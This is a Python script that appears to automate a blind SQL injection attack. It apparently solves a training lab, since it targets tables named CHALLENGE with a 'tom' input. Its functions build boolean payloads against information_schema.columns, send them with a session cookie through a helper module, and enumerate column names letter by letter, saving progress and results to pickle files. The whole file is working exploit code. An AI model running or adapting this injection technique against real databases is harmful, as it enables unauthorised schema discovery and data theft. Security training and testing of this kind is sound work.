import pickle
import string
import tabulate

from helpers import inject


def print_columns():
    """
    Reads the columns.pkl file and prints the data using the tabulate library.

    :return: None
    """

    data = pickle.load(open('outputs/columns.pkl', 'rb'))
    row = []
    for entry in data:
        for table_name, columns in entry.items():
            row.append([table_name, ','.join(columns)])

    print(tabulate.tabulate(row, headers=["Table Name", "Column Names"]))


def check_query(table_name, column_name):
    """
    Returns a query string for SQL injection that is used to find the candidate names that are valid.

    :param table_name: Name of the table
    :param column_name: Name of the column
    :return: Query string
    """
    return f'tom\' and exists (select * from information_schema.columns where table_name=\'{table_name}\' ' \
           f'and column_name= \'{column_name}\')--'


def builder_query(table_name, length, word):
    """
    Returns a query string for SQL injection that is used to build the list of possible candidates.

    :param table_name: Name of the table to search for
    :param length: Length of teh sequence
    :param word: Sequence of letters
    :return: Query string
    """
    return f'tom\' and exists (select * from information_schema.columns where table_name=\'{table_name}\' ' \
           f'and substring(column_name,1,{length})=\'{word}\')--'


def get_column_names(cookie):
    """
    Retrieves the column names by reading the table names from the tables.pkl file.
    Only the tables with name starting with CHALLENGE are considered.

    Saves the program state while iteration and the output as a list of dict<table_name, list(column_name)>

    :param cookie: Session cookie required by the header
    :return: None
    """
    tables = []
    columns = []
    all_tables = pickle.load(open('outputs/tables.pkl', 'rb'))
    no_of_queries = 0

    for i in all_tables:
        if i.startswith('CHALLENGE'):
            tables.append(i)

    alphabets = string.ascii_letters + '_'

    for table_name in tables:
        all_columns = []
        column_dict = {table_name: []}
        queue = ['']
        program_state_columns = []

        while queue:
            queue_word = queue.pop(0)
            for a in alphabets:
                word = queue_word + a
                query = builder_query(table_name=table_name, length=len(word), word=word)
                no_of_queries += 1
                if inject.inject(cookie=cookie, query=query):
                    print(f'Found Word: {word}, {len(word)} - Table: {table_name}')
                    all_columns.append(word)
                    queue.append(word)

            program_state_columns.append([queue, all_columns])
            pickle.dump(program_state_columns, open('states/program_state_column.pkl', 'wb'))

        for name in all_columns:
            query = check_query(table_name=table_name, column_name=name)
            no_of_queries += 1
            if inject.check(cookie, query):
                print(f'Found Column: {name}')
                column_dict[table_name].append(name)
        columns.append(column_dict)

        print(columns)
        pickle.dump(columns, open('outputs/columns.pkl', 'wb'))
    print(f'No of queries: {no_of_queries}')